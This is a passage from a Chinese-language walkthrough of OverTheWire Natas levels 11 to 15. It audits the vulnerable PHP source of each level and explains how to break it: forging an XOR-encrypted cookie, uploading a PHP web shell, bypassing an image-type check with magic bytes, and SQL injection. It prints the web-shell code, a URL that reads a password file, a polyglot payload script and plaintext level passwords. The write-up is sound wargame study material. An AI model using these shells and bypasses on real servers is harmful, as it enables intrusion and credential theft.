<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$defaultdata</span> = <span class="keyword">array</span>( <span class="string">&quot;showpassword&quot;</span>=&gt;<span class="string">&quot;no&quot;</span>, <span class="string">&quot;bgcolor&quot;</span>=&gt;<span class="string">&quot;#ffffff&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xor_encrypt</span>(<span class="params"><span class="variable">$in</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&#x27;&lt;censored&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$text</span> = <span class="variable">$in</span>;</span><br><span class="line">    <span class="variable">$outText</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Iterate through each character</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$text</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$outText</span> .= <span class="variable">$text</span>[<span class="variable">$i</span>] ^ <span class="variable">$key</span>[<span class="variable">$i</span> % <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$outText</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadData</span>(<span class="params"><span class="variable">$def</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_COOKIE</span>;</span><br><span class="line">    <span class="variable">$mydata</span> = <span class="variable">$def</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;data&quot;</span>, <span class="variable">$_COOKIE</span>)) &#123;</span><br><span class="line">    <span class="variable">$tempdata</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">xor_encrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>])), <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$tempdata</span>) &amp;&amp; <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;showpassword&quot;</span>, <span class="variable">$tempdata</span>) &amp;&amp; <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;bgcolor&quot;</span>, <span class="variable">$tempdata</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^#(?:[a-f\d]&#123;6&#125;)$/i&#x27;</span>, <span class="variable">$tempdata</span>[<span class="string">&#x27;bgcolor&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$mydata</span>[<span class="string">&#x27;showpassword&#x27;</span>] = <span class="variable">$tempdata</span>[<span class="string">&#x27;showpassword&#x27;</span>];</span><br><span class="line">        <span class="variable">$mydata</span>[<span class="string">&#x27;bgcolor&#x27;</span>] = <span class="variable">$tempdata</span>[<span class="string">&#x27;bgcolor&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$mydata</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saveData</span>(<span class="params"><span class="variable">$d</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;data&quot;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">xor_encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$d</span>))));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">loadData</span>(<span class="variable">$defaultdata</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;bgcolor&quot;</span>,<span class="variable">$_REQUEST</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^#(?:[a-f\d]&#123;6&#125;)$/i&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;bgcolor&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$data</span>[<span class="string">&#x27;bgcolor&#x27;</span>] = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;bgcolor&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">saveData</span>(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&quot;showpassword&quot;</span>] == <span class="string">&quot;yes&quot;</span>) &#123;  </span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;The password for natas12 is &lt;censored&gt;&lt;br&gt;&quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>源码分析</strong>：服务端的 <code>loadData</code>
函数会对我们请求提交的 <code>cookie</code> 进行解码解密，解密后赋值给
<code>$data</code> ，接着判断
<code>$data["showpassword"] == "yes"</code> ，条件成立则打印出
<code>natas12</code> 的密码。接着看 <code>cookie</code>
是如何生成的，<code>setcookie("data", base64_encode(xor_encrypt(json_encode($d))));</code>
重点在于 <code>xor_encrypt</code>
函数，如果知道<code>$key</code>，我们本地也可以直接构造个
<code>"showpassword"=&gt;"yes"</code> 的 <code>cookie</code>
，由于异或运算有如下特点</p>
<blockquote>
<p>If: Plain ⊕ Key = Cipher<br />
Then: Plain ⊕ Key ⊕ Plain = Cipher ⊕ Plain<br />
Therefore: Key = Cipher ⊕ Plain</p>
</blockquote>
<p>所以，<code>$key = base64_decode($_COOKIE["data"]) ⊕ &#123;"showpassword":"no","bgcolor":"#ffffff"&#125;)</code>
=&gt;
<code>$_COOKIE["data"]=base64_encode($key⊕&#123;"showpassword":"yes","bgcolor":"#ffffff"&#125;)</code></p>
<p><a href="https://gchq.github.io/CyberChef/">在线 CyberChef</a></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202311041201065.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202311041202478.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202311041202757.png" /></p>
<p>得
<code>The password for natas12 is YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG</code></p>
<h2 id="natas-level-11-level-12">13. Natas Level 11 → Level 12</h2>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Username:</span> natas13</span><br><span class="line"><span class="symbol">URL:</span>      http://natas13.natas.labs.overthewire<span class="meta">.org</span></span><br></pre></td></tr></table></figure>
<p>审计源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;!-- This stuff in the header has nothing to <span class="keyword">do</span> with the level --&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;http://natas.labs.overthewire.org/css/level.css&quot;</span>&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot;</span> /&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;http://natas.labs.overthewire.org/css/wechall.css&quot;</span> /&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=http:<span class="comment">//natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line">&lt;script&gt;<span class="keyword">var</span> wechallinfo = &#123; <span class="string">&quot;level&quot;</span>: <span class="string">&quot;natas12&quot;</span>, <span class="string">&quot;pass&quot;</span>: <span class="string">&quot;&lt;censored&gt;&quot;</span> &#125;;&lt;/script&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;natas12&lt;/h1&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;content&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">genRandomString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$length</span> = <span class="number">10</span>;</span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span>;</span><br><span class="line">    <span class="variable">$string</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$p</span> = <span class="number">0</span>; <span class="variable">$p</span> &lt; <span class="variable">$length</span>; <span class="variable">$p</span>++) &#123;</span><br><span class="line">        <span class="variable">$string</span> .= <span class="variable">$characters</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>)-<span class="number">1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeRandomPath</span>(<span class="params"><span class="variable">$dir</span>, <span class="variable">$ext</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="variable">$dir</span>.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">genRandomString</span>().<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$path</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$path</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeRandomPathFromFilename</span>(<span class="params"><span class="variable">$dir</span>, <span class="variable">$fn</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$fn</span>, PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">makeRandomPath</span>(<span class="variable">$dir</span>, <span class="variable">$ext</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;filename&quot;</span>, <span class="variable">$_POST</span>)) &#123;</span><br><span class="line">    <span class="variable">$target_path</span> = <span class="title function_ invoke__">makeRandomPathFromFilename</span>(<span class="string">&quot;upload&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">filesize</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploadedfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]) &gt; <span class="number">1000</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is too big&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploadedfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$target_path</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;The file &lt;a href=\&quot;<span class="subst">$target_path</span>\&quot;&gt;<span class="subst">$target_path</span>&lt;/a&gt; has been uploaded&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;There was an error uploading the file, please try again!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form enctype=<span class="string">&quot;multipart/form-data&quot;</span> action=<span class="string">&quot;index.php&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;MAX_FILE_SIZE&quot;</span> value=<span class="string">&quot;1000&quot;</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;filename&quot;</span> value=<span class="string">&quot;&lt;?php print genRandomString(); ?&gt;.jpg&quot;</span> /&gt;</span><br><span class="line">Choose a JPEG to <span class="title function_ invoke__">upload</span> (max <span class="number">1</span>KB):&lt;br/&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;uploadedfile&quot;</span> type=<span class="string">&quot;file&quot;</span> /&gt;&lt;br /&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Upload File&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br><span class="line">&lt;div id=<span class="string">&quot;viewsource&quot;</span>&gt;&lt;a href=<span class="string">&quot;index-source.html&quot;</span>&gt;View sourcecode&lt;/a&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>服务端虽然对上传的文件进行了重命名，但没有对文件内容和类型做任何过滤，可以考虑上传个php脚本实现命令注入攻击，需注意的是，服务端在对文件重命名时，是从前面代码倒数第10行的filename中读取的后缀，不是我们所上传文件的后缀，所以上传时需要抓包改filename的后缀。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$output</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202311041844501.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202311041844261.png" /></p>
<p><code>http://natas12.natas.labs.overthewire.org/upload/fs0qjodx0r.php?cmd=cat%20/etc/natas_webpass/natas13</code></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202311041844554.png" /></p>
<p>得 <code>natas13</code>
的password：<code>lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9</code></p>
<h2 id="natas-level-12-level-13">14. Natas Level 12 → Level 13</h2>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Username:</span> natas13</span><br><span class="line"><span class="symbol">URL:</span>      http://natas13.natas.labs.overthewire<span class="meta">.org</span></span><br></pre></td></tr></table></figure>
<p>审计源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">genRandomString</span>(<span class="params"></span>) </span>&#123;    <span class="variable">$length </span>= <span class="number">10</span>;    <span class="variable">$characters </span>= <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span>;    <span class="variable">$string </span>= <span class="string">&quot;&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span><span class="title function_ invoke__"> </span>(<span class="variable">$p </span>= <span class="number">0</span>; <span class="variable">$p </span>&lt; <span class="variable">$length</span>; <span class="variable">$p</span>++) &#123;        <span class="variable">$string </span>.= <span class="variable">$characters</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>)-<span class="number">1</span>)];  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeRandomPath</span>(<span class="params"><span class="variable">$dir</span>, <span class="variable">$ext</span></span>) </span>&#123;  </span><br><span class="line">    <span class="keyword">do</span> &#123;    <span class="variable">$path </span>= <span class="variable">$dir</span>.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">genRandomString</span>().<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>;  </span><br><span class="line">    &#125; <span class="keyword">while</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$path</span>));  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$path</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeRandomPathFromFilename</span>(<span class="params"><span class="variable">$dir</span>, <span class="variable">$fn</span></span>) </span>&#123;    <span class="variable">$ext </span>= <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$fn</span>, PATHINFO_EXTENSION);  </span><br><span class="line">    <span class="keyword">return</span><span class="title function_ invoke__"> makeRandomPath</span>(<span class="variable">$dir</span>, <span class="variable">$ext</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;filename&quot;</span>, <span class="variable">$_POST</span>)) &#123;    <span class="variable">$target_path </span>= <span class="title function_ invoke__">makeRandomPathFromFilename</span>(<span class="string">&quot;upload&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>]);    <span class="variable">$err</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;uploadedfile&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];  </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$err</span>)&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$err </span>=== <span class="number">2</span>)&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;The uploaded file exceeds MAX_FILE_SIZE&quot;</span>;  </span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Something went wrong :/&quot;</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">else</span><span class="title function_ invoke__"> if</span>(<span class="title function_ invoke__">filesize</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploadedfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]) &gt; <span class="number">1000</span>) &#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is too big&quot;</span>;  </span><br><span class="line">    &#125; <span class="keyword">else</span><span class="title function_ invoke__"> if </span>(! <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploadedfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is not an image&quot;</span>;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploadedfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$target_path</span>)) &#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;The file &lt;a href=\&quot;<span class="subst">$target_path</span>\&quot;&gt;<span class="subst">$target_path</span>&lt;/a&gt; has been uploaded&quot;</span>;  </span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;There was an error uploading the file, please try again!&quot;</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>服务端主要对文件类型做了校验【exif_imagetype函数】，exif_imagetype函数通过读取图像第一字节检验，谷歌知文件第一字节为
<code>FF D8 FF DB</code> 即可绕过exif_imagetype函数的过滤，为此</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">string = <span class="string">&quot;&quot;&quot;&lt;?php  </span></span><br><span class="line"><span class="string">  echo file_get_contents( &quot;/etc/natas_webpass/natas14&quot; );?&gt;&quot;&quot;&quot;</span>  </span><br><span class="line">  </span><br><span class="line">hex_string = string.encode(<span class="string">&quot;utf-8&quot;</span>).<span class="built_in">hex</span>()  </span><br><span class="line">payload = <span class="string">&quot;ffd8ffdb&quot;</span> + hex_string  </span><br><span class="line"><span class="built_in">print</span>(payload)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;poc.php&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> textfile:  </span><br><span class="line">    textfile.write(<span class="built_in">bytes</span>.fromhex(payload))</span><br></pre></td></tr></table></figure>
<p>即</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202311251748638.png" /></p>
<p>上传poc.php，并抓包改后缀</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202311251748305.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202311251749344.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202311251750487.png" /></p>
<p>得 <code>natas14</code> 的
passwd：<code>qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP</code></p>
<h2 id="natas-level-13-level-14">15. Natas Level 13 → Level 14</h2>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Username:</span> natas14</span><br><span class="line"><span class="symbol">URL:</span>      http://natas14.natas.labs.overthewire<span class="meta">.org</span></span><br></pre></td></tr></table></figure>
<p>审计源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;username&quot;</span>, <span class="variable">$_REQUEST</span>)) &#123;</span><br><span class="line">    <span class="variable">$link</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;natas14&#x27;</span>, <span class="string">&#x27;&lt;censored&gt;&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mysqli_select_db</span>(<span class="variable">$link</span>, <span class="string">&#x27;natas14&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT * from users where username=\&quot;&quot;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;\&quot; and password=\&quot;&quot;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&quot;password&quot;</span>].<span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;debug&quot;</span>, <span class="variable">$_GET</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Executing query: <span class="subst">$query</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="variable">$query</span>)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Successful login! The password for natas15 is &lt;censored&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Access denied!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$link</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>简单的登录验证操作，只不过没做任何安全防范措施，可以直接进行SQL注入</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202311251808359.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202311251808926.png" /></p>
<p>得 <code>natas15</code> password is
<code>TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB</code></p>
<h2 id="natas-level-14-level-15">16. Natas Level 14 → Level 15</h2>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Username:</span> natas15</span><br><span class="line"><span class="symbol">URL:</span>      http://natas15.natas.labs.overthewire<span class="meta">.org</span></span><br></pre></td></tr></table></figure>
<p>审计源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">CREATE TABLE `users` (</span></span><br><span class="line"><span class="comment">  `username` varchar(64) DEFAULT NULL,</span></span><br><span class="line"><span class="comment">  `password` varchar(64) DEFAULT NULL</span></span><br><span class="line"><span class="comment">);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;username&quot;</span>, <span class="variable">$_REQUEST</span>)) &#123;</span><br><span class="line">    <span class="variable">$link</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;natas15&#x27;</span>, <span class="string">&#x27;&lt;censored&gt;&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mysqli_select_db</span>(<span class="variable">$link</span>, <span class="string">&#x27;natas15&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT * from users where username=\&quot;&quot;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;debug&quot;</span>, <span class="variable">$_GET</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Executing query: <span class="subst">$query</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$res</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$res</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;This user exists.&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;   </span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;This user doesn&#x27;t exist.&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Error in query.&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$link</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>SQL注入依旧存在，虽然说不会直接反馈查询结果，但可以通过对不同查询结果输出信息的不同间接获取有用信息，进一步测试发现
<code>natas16</code> 用户是存在的，为此可以用 <code>like</code>
关键字获取对应的 <code>password</code> 信息。</p>
<p>首先模糊匹配 <code>password</code> 一定包含的字符，接着对
<code>password</code> 进行爆破</p>
